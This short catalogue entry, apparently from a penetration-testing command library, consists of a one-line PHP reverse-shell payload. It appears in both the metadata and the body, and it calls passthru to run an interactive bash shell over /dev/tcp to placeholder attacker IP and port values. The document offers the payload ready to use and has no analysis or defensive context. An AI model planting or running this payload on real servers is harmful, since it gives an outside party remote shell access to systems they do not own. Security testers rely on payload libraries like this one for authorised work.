---
id: 1ee74610-c6ed-4cee-9e0c-dfb515c6021f
name: PHP Reverse Shell with Passthrough
type: command
executor: null
data: <?php passthru("bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1"); ?>
output: null
created_at: '2019-09-17T19:34:48.743750+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP Reverse Shell with Passthrough

```bash
<?php passthru("bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1"); ?>
```
